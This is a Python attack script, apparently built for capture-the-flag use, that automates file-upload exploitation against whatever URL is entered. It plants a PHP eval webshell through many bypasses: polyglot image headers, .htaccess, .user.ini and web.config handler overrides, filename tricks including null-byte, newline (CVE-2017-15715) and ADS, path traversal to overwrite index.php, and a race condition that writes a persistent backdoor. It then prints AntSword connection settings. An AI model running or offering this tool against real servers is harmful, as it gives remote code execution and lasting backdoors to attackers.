import requests
from bs4 import BeautifulSoup
import random
import string
import time
import re
import threading
import concurrent.futures

class CTFPwnUpload:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        form_info = self._detect_upload_form(target_url)
        self.upload_endpoint = form_info.get("action") or target_url
        self.file_fields = form_info.get("file_fields") or ["file"]
        self.hidden_fields = form_info.get("hidden_fields") or {}

        # 基础配置
        self.shell_password = "1"
        self.base_shell = f"<?php @eval($_POST[{self.shell_password}]); ?>"
        self.base_shell_bytes = self.base_shell.encode("utf-8")

        # 开关: CTF 默认允许激进策略
        self.aggressive = True

        # 常见 MIME 类型字典 (来源 PDF 课程内容)
        self.mime_candidates = [
            "image/jpeg",
            "image/png",
            "image/gif",
            "text/plain",
            "application/octet-stream",
            "application/x-php",
            "image/x.php",
        ]

        # 常见后缀字典 (适配黑白名单与双扩展)
        self.ext_candidates = [
            ".php",
            ".php5",
            ".phtml",
            ".php.jpg",
            ".jpg.php",
            ".php;.jpg",
        ]

        # 针对性 Payload (基于 PDF 和你的要求)
        self.payloads = {
            # 1. 基础一句话
            "simple": self.base_shell_bytes,

            # 2. 绕过短标签与头部检测 (GIF 头 + script 标签)
            "script_tag": b"GIF89a?\n<script language=\"php\">eval($_REQUEST['1'])</script>",

            # 3. .htaccess 配置
            # 强制将 shell.jpg 解析为 PHP
            "htaccess": b"""<FilesMatch \"shell.jpg\">\nSetHandler application/x-httpd-php\n</FilesMatch>""",

            # 4. .user.ini 配置
            # 让同目录下的 php 文件自动包含 2.jpg
            "user_ini": b"auto_prepend_file=2.jpg",

            # 5. 空文件 / 畸形文件
            "empty": b"",

            # 6. IIS web.config (尝试将 .jpg 映射为 PHP 解析)
            "web_config": b'<?xml version="1.0" encoding="UTF-8"?><configuration><system.webServer><staticContent><mimeMap fileExtension=".jpg" mimeType="application/x-httpd-php" /></staticContent></system.webServer></configuration>',
        }

    def _detect_upload_form(self, url):
        """自动探测上传表单/字段"""
        info = {"action": url, "file_fields": [], "hidden_fields": {}}
        try:
            r = self.session.get(url, timeout=8)
            soup = BeautifulSoup(r.text, "html.parser")
            form = soup.find("form", enctype=re.compile("multipart/form-data", re.I))
            if not form:
                return info

            action = form.get("action") or url
            if not action.startswith("http"):
                action = requests.compat.urljoin(url, action)
            info["action"] = action

            for inp in form.find_all("input"):
                itype = (inp.get("type") or "").lower()
                name = inp.get("name")
                if not name:
                    continue
                if itype == "file":
                    info["file_fields"].append(name)
                if itype in {"hidden", "submit"}:
                    info["hidden_fields"][name] = inp.get("value") or ""
        except Exception:
            pass
        return info

    def _generate_name(self, ext):
        return ''.join(random.choices(string.ascii_lowercase, k=6)) + ext

    def upload_file(self, filename, content, mime_type="image/jpeg", field_name="file", params=None, extra_data=None):
        """核心上传函数"""
        if isinstance(content, str):
            content = content.encode("utf-8")

        files = {
            field_name: (filename, content, mime_type)
        }
        # 常见的提交按钮名称，防止后端检查
        data = {"submit": "upload", "Upload": "Submit"}
        data.update(self.hidden_fields)
        if extra_data:
            data.update(extra_data)
        try:
            print(f"[*] 正在上传: {filename} (字段: {field_name}, MIME: {mime_type})...")
            r = self.session.post(self.upload_endpoint, files=files, data=data, params=params, timeout=8)
            return r
        except Exception as e:
            print(f"[-] 上传异常: {e}")
            return None

    def extract_path(self, response_text, filename):
        """尝试从回显中提取文件路径"""
        if not response_text:
            return None
        # 1. 精确匹配文件名
        if filename in response_text:
            # 尝试寻找常见路径结构
            paths = re.findall(r'[\w/\\:.]+' + re.escape(filename), response_text)
            if paths:
                # 清洗路径
                clean_path = paths[0].replace('\\', '/').lstrip('./')
                return requests.compat.urljoin(self.target_url, clean_path)

        # 2. 从 HTML 标签提取 src/href
        try:
            soup = BeautifulSoup(response_text, "html.parser")
            for tag in soup.find_all(["a", "img"]):
                attr = "href" if tag.name == "a" else "src"
                url = tag.get(attr) or ""
                if filename in url:
                    return requests.compat.urljoin(self.target_url, url)
        except Exception:
            pass
        
        # 3. 盲猜常见目录
        guess_dirs = ['uploads/', 'upload/', 'images/', 'files/', './']
        for d in guess_dirs:
            # 简单拼接，实际情况可能需要更复杂的路径处理
            return requests.compat.urljoin(self.target_url, f"{d}{filename}")

    def verify_shell(self, url):
        """验证 Webshell 是否存活"""
        try:
            # 尝试通过 POST 1=echo test; 执行代码
            # 注意: 如果是 <script> 标签 payload，可能需要 REQUEST 接收
            payload = {self.shell_password: "echo 'ANT_CONNECTED';"}
            r = self.session.post(url, data=payload, timeout=5)
            if 'ANT_CONNECTED' in r.text:
                return True
            # 针对 GIF89a + script 标签的特殊验证 (如果是 GET)
            r2 = self.session.get(url, timeout=5)
            if 'GIF89a' in r2.text and r2.status_code == 200:
                print(f"[!] 警告: 文件已上传但未执行代码 (可能未解析为PHP)，由于存在GIF头，请尝试文件包含利用。")
                return False
        except:
            pass
        return False

    def _build_polyglot_jpeg(self, php_payload: bytes) -> bytes:
        """构造 JPEG 头 + PHP 代码 (绕过文件头检测)"""
        jpeg_header = b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00"
        return jpeg_header + php_payload

    def print_antsword_config(self, shell_url):
        """输出蚁剑配置信息"""
        print("\n" + "="*40)
        print(" [★] 漏洞利用成功！")
        print(f" [★] 蚁剑 (AntSword) 连接配置:")
        print(f" [+] URL 地址: {shell_url}")
        print(f" [+] 连接密码: {self.shell_password}")
        print(f" [+] 编码器:   默认 (Base64) 或 Chr")
        print(f" [+] 其它:     如果是 <script> 类型马，连接类型可能需选 'Custom'")
        print("="*40 + "\n")

    def run_strategy_htaccess(self):
        """策略: Apache .htaccess 解析漏洞"""
        print("\n[+] 启动策略: Apache .htaccess 解析利用")
        
        # 步骤 1: 上传 .htaccess
        # 强制将 shell.jpg 解析为 php
        fname_conf = ".htaccess"
        res = self.upload_file(fname_conf, self.payloads['htaccess'], 'application/octet-stream', field_name=self.file_fields[0])

        if not res or res.status_code != 200:
            print("[-] .htaccess 上传失败或被拦截")
            return

        # 步骤 2: 上传图片马 shell.jpg
        # 这里使用你提供的 GIF89a + Script 组合，以此绕过内容检测
        fname_shell = "shell.jpg"
        content_shell = self.payloads['script_tag']
        
        res_shell = self.upload_file(fname_shell, content_shell, 'image/jpeg', field_name=self.file_fields[0])

        # 验证
        shell_url = self.extract_path(res_shell.text if res_shell else "", fname_shell)
        print(f"[*] 尝试访问 Shell: {shell_url}")
        
        if self.verify_shell(shell_url):
            self.print_antsword_config(shell_url)
            return True
        else:
            print("[-] .htaccess 策略利用失败 (可能不是 Apache 或 AllowOverride None)")

    def run_strategy_user_ini(self):
        """策略: PHP .user.ini 包含漏洞"""
        print("\n[+] 启动策略: .user.ini 包含利用 (Nginx/Apache + PHP-FPM)")
        
        # 步骤 1: 上传 .user.ini
        # 配置: auto_prepend_file=2.jpg
        fname_conf = ".user.ini"
        res = self.upload_file(fname_conf, self.payloads['user_ini'], 'application/octet-stream', field_name=self.file_fields[0]) # 有时需要绕过 MIME 检测
        
        # 步骤 2: 上传 2.jpg (木马)
        # 包含正常的 PHP 代码
        fname_shell = "2.jpg"
        content_shell = self.payloads['simple']
        res_shell = self.upload_file(fname_shell, content_shell, 'image/jpeg', field_name=self.file_fields[0])
        
        # 验证: 这一步比较特殊，.user.ini 生效需要访问目录下任意 *存在的 PHP 文件*
        # 我们尝试访问 readme.php, index.php 或者再次上传一个合法的 info.php
        print("[*] .user.ini 模式下，需要等待 CGI 缓存刷新 (通常 300s，CTF 可能较短)")
        print("[*] 尝试探测常见 PHP 文件以触发包含...")
        
        common_php = ['index.php', 'readme.php', 'upload.php']
        # 假设上传目录在 uploads/
        shell_path = self.extract_path(res_shell.text if res_shell else "", fname_shell)
        if not shell_path:
            print("[-] 无法从回显中提取路径，无法自动触发 .user.ini")
            return
        base_dir = shell_path.rsplit('/', 1)[0] + '/'
        
        for php in common_php:
            trigger_url = base_dir + php
            if self.verify_shell(trigger_url):
                print(f"[!] 成功通过 {php} 包含后门！")
                self.print_antsword_config(trigger_url)
                return True
        print("[-] .user.ini 策略未自动触发 (请手动访问上传目录下的任意 .php 文件)")

    def run_strategy_fuzz(self):
        """策略: 常规后缀与 MIME 模糊测试"""
        print("\n[+] 启动策略: 常规 MIME/后缀 Fuzz")

        # 组合拳: 特殊后缀 + GIF89a 头 + Script 标签
        for ext in self.ext_candidates:
            fname = self._generate_name(ext)
            content = self.payloads["script_tag"]
            for mime in self.mime_candidates:
                res = self.upload_file(fname, content, mime, field_name=self.file_fields[0])
                shell_url = self.extract_path(res.text if res else "", fname)
                if shell_url and self.verify_shell(shell_url):
                    self.print_antsword_config(shell_url)
                    return True
        print("[-] 常规 Fuzz 未成功")

    def run_strategy_magic_header(self):
        """策略: 文件头检测绕过 (JPEG 头 + PHP)"""
        print("\n[+] 启动策略: 文件头伪造 (Magic Header) 绕过")

        fname = self._generate_name(".jpg")
        content = self._build_polyglot_jpeg(self.base_shell_bytes)
        for mime in ("image/jpeg", "application/octet-stream"):
            res = self.upload_file(fname, content, mime, field_name=self.file_fields[0])
            shell_url = self.extract_path(res.text if res else "", fname)
            if shell_url and self.verify_shell(shell_url):
                self.print_antsword_config(shell_url)
                return True
        print("[-] Magic Header 绕过未成功")

    def run_strategy_param_ext(self):
        """策略: GET/POST 参数控制后缀"""
        print("\n[+] 启动策略: 参数控制后缀 (ext) 探测")
        fname = self._generate_name(".jpg")
        content = self.base_shell_bytes
        params_list = [
            {"ext": "php"},
            {"extension": "php"},
            {"suffix": "php"},
        ]
        for params in params_list:
            res = self.upload_file(fname, content, "image/jpeg", field_name=self.file_fields[0], params=params)
            shell_url = self.extract_path(res.text if res else "", fname)
            if shell_url and self.verify_shell(shell_url):
                self.print_antsword_config(shell_url)
                return True
        print("[-] 参数控制后缀未成功")

    def run_strategy_array_confusion(self):
        """策略: 多文件上传数组混淆"""
        print("\n[+] 启动策略: 多文件上传数组混淆")
        field_candidates = [
            "files[]",
            "files[0]",
            "files[a.php]",
        ]
        fname = self._generate_name(".php")
        content = self.base_shell_bytes
        for field in field_candidates + self.file_fields:
            res = self.upload_file(fname, content, "image/jpeg", field_name=field)
            shell_url = self.extract_path(res.text if res else "", fname)
            if shell_url and self.verify_shell(shell_url):
                self.print_antsword_config(shell_url)
                return True
        print("[-] 数组混淆未成功")

    def run_strategy_empty_file(self):
        """策略: 空文件/畸形文件测试"""
        print("\n[+] 启动策略: 空文件/畸形文件绕过")
        fname = self._generate_name(".jpg")
        res = self.upload_file(fname, self.payloads["empty"], "image/jpeg", field_name=self.file_fields[0])
        if res and res.status_code == 200:
            print("[!] 空文件已上传，请检查服务端是否错误保存或绕过后续校验")
            return True
        print("[-] 空文件绕过未成功")

    def run_strategy_path_traversal(self):
        """策略: 路径遍历覆盖 (高风险)"""
        print("\n[+] 启动策略: 路径遍历覆盖 (仅限 CTF)")
        traversal_names = ["../index.php", "..\\index.php"]
        for name in traversal_names:
            res = self.upload_file(name, self.base_shell_bytes, "application/octet-stream", field_name=self.file_fields[0])
            if res and res.status_code == 200:
                print("[!] 可能存在路径遍历覆盖风险，请手动验证是否覆盖成功")
                return True
        print("[-] 路径遍历覆盖未成功")

    def run_strategy_windows_bypass(self):
        """策略: Windows 特性绕过 (点号/空格/ADS)"""
        print("\n[+] 启动策略: Windows 特性绕过 (点号/空格/ADS)")
        # 1. 点号绕过 shell.php.
        # 2. 空格绕过 shell.php+空格
        # 3. ADS 绕过 shell.php::$DATA
        tricks = [
            ("shell.php.", "点号绕过"),
            ("shell.php ", "空格绕过"),
            ("shell.php::$DATA", "ADS数据流绕过")
        ]
        
        content = self.base_shell_bytes
        
        for name, desc in tricks:
            res = self.upload_file(name, content, "image/jpeg", field_name=self.file_fields[0])
            # 对于 ::$DATA，上传后文件名通常是 shell.php
            # 对于点号和空格，Windows 保存时通常会自动去除
            check_name = "shell.php" if "::" in name else name.strip(". ")
            
            shell_url = self.extract_path(res.text if res else "", check_name)
            if shell_url and self.verify_shell(shell_url):
                 print(f"[!] 成功: {desc}")
                 self.print_antsword_config(shell_url)
                 return True
        print("[-] Windows 特性绕过未成功")

    def run_strategy_filename_manipulation(self):
         """策略: 文件名混淆 (00截断/双写/换行)"""
         print("\n[+] 启动策略: 文件名混淆 (00截断/双写/换行)")
         
         # 1. 00 截断 (PHP < 5.3.4)
         # 2. 双写 shell.pphphp
         # 3. 换行解析 (CVE-2017-15715)
         tricks = [
             ("shell.php\x00.jpg", "image/jpeg", "00截断"),
             ("shell.pphphp", "image/jpeg", "双写绕过"),
             ("shell.php\n", "image/jpeg", "CVE-2017-15715 换行解析")
         ]
         
         content = self.base_shell_bytes
         for name, mime, desc in tricks:
             res = self.upload_file(name, content, mime, field_name=self.file_fields[0])
             
             check_name = name
             if "\x00" in name:
                 check_name = name.split("\x00")[0]
             elif "pphphp" in name:
                 check_name = "shell.php" 
             elif "\n" in name:
                 check_name = name.strip()
                 
             shell_url = self.extract_path(res.text if res else "", check_name)
             if not shell_url and "pphphp" in name:
                  shell_url = self.extract_path(res.text if res else "", "shell.php")

             if shell_url and self.verify_shell(shell_url):
                 print(f"[!] 成功: {desc}")
                 self.print_antsword_config(shell_url)
                 return True
         print("[-] 文件名混淆未成功")

    def run_strategy_web_config(self):
        """策略: IIS web.config 配置上传"""
        print("\n[+] 启动策略: IIS web.config 利用")
        
        # 步骤 1: 上传 web.config
        res = self.upload_file("web.config", self.payloads["web_config"], "text/xml", field_name=self.file_fields[0])
        if not res or res.status_code != 200:
            print("[-] web.config 上传可能失败")

        # 步骤 2: 上传 shell.jpg
        name = "shell.jpg"
        res2 = self.upload_file(name, self.base_shell_bytes, "image/jpeg", field_name=self.file_fields[0])
        
        shell_url = self.extract_path(res2.text if res2 else "", name)
        if shell_url and self.verify_shell(shell_url):
             self.print_antsword_config(shell_url)
             return True
        print("[-] web.config 策略利用失败")

    def run_strategy_nginx_parsing(self):
        """策略: Nginx 解析漏洞 (image.jpg/.php)"""
        print("\n[+] 启动策略: Nginx 解析漏洞探测")
        # 上传一个合法的图片，内容包含 PHP
        fname = "nginx_test.jpg"
        content = self._build_polyglot_jpeg(self.base_shell_bytes)
        res = self.upload_file(fname, content, "image/jpeg", field_name=self.file_fields[0])
        
        base_url = self.extract_path(res.text if res else "", fname)
        if not base_url:
            print("[-] 无法获取上传路径，跳过")
            return

        vulnerable_urls = [
            base_url + "/shell.php",
            base_url + "/.php",
            base_url + "%00.php", 
        ]
        
        for u in vulnerable_urls:
            # check status 200, but extract_path implies we need execution
            if self.verify_shell(u):
                print(f"[!] 发现 Nginx 解析漏洞: {u}")
                self.print_antsword_config(u)
                return True
        print("[-] Nginx 解析漏洞未触发")

    def run_strategy_race_condition(self, duration=5):
        """策略: 条件竞争 (多线程并发)"""
        print(f"\n[+] 启动策略: 条件竞争 (持续 {duration} 秒)")
        # 目标: 上传 shell.php -> 访问 shell.php -> 生成 shell_persistent.php
        fname = "race.php"
        # 竞争 Payload: 如果执行成功，写入一个新文件 ensure_shell.php
        p_content = b"<?php file_put_contents('ensure_shell.php', '<?php @eval($_POST[1]);?>'); echo 'RACE_SUCCESS'; ?>"
        
        stop_event = threading.Event()
        success_event = threading.Event()
        
        def _upload_worker():
            while not stop_event.is_set() and not success_event.is_set():
                self.upload_file(fname, p_content, "image/jpeg", field_name=self.file_fields[0])
                
        def _access_worker(url):
            while not stop_event.is_set() and not success_event.is_set():
                try:
                    r = self.session.get(url, timeout=2)
                    if "RACE_SUCCESS" in r.text:
                        success_event.set()
                except:
                    pass

        # 1. 尝试探测路径 (先上传一次获取路径)
        res0 = self.upload_file(fname, p_content, "image/jpeg", field_name=self.file_fields[0])
        url0 = self.extract_path(res0.text if res0 else "", fname)
        if not url0:
            print("[-] 无法获取竞争文件路径，尝试盲猜默认路径...")
            # 简单盲猜
            url0 = requests.compat.urljoin(self.target_url, fname)
        
        base_dir = url0.rsplit('/', 1)[0] + '/'
        ensure_url = base_dir + "ensure_shell.php"
            
        print(f"[*] 竞争目标 URL: {url0}")
        print(f"[*] 预期生成 URL: {ensure_url}")

        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            # 5个上传线程，5个访问线程
            for _ in range(5):
                executor.submit(_upload_worker)
                executor.submit(_access_worker, url0)
            
            time.sleep(duration)
            stop_event.set()
            
        if success_event.is_set() or self.verify_shell(ensure_url):
            print("[!] 条件竞争利用成功！")
            self.print_antsword_config(ensure_url)
            return True
        print("[-] 条件竞争利用失败")

    def run(self):
        print(f"[*] 开始对 {self.target_url} 进行综合测试")
        
        # 1. .htaccess (High Priority)
        if self.run_strategy_htaccess(): return
        
        # 2. Windows 特性 (点号/空格/ADS)
        if self.run_strategy_windows_bypass(): return
        
        # 3. 文件名混淆 (00截断/双写/换行)
        if self.run_strategy_filename_manipulation(): return
        
        # 4. 常规 Fuzz
        if self.run_strategy_fuzz(): return

        # 5. 文件头伪造
        if self.run_strategy_magic_header(): return

        # 6. Nginx 解析漏洞
        if self.run_strategy_nginx_parsing(): return
        
        # 7. IIS Web.config
        if self.run_strategy_web_config(): return

        # 8. 参数控制
        if self.run_strategy_param_ext(): return

        # 9. 数组混淆
        if self.run_strategy_array_confusion(): return

        # 10. 空文件
        self.run_strategy_empty_file()

        # 11. 路径遍历
        if self.aggressive:
            self.run_strategy_path_traversal()
            
        # 12. .user.ini
        if self.run_strategy_user_ini(): return
        
        # 13. 条件竞争 (最后尝试，因为耗时)
        print("\n[*] 是否尝试条件竞争 (Race Condition)? (可能耗时较长) [y/N]")
        # 交互式太麻烦，默认在 aggressive 模式下尝试 3 秒
        if self.aggressive:
            self.run_strategy_race_condition(duration=3)

if __name__ == "__main__":
    url = input("请输入题目地址 (例如 http://ctf.com/upload/): ").strip()
    pwn = CTFPwnUpload(url)
    pwn.run()
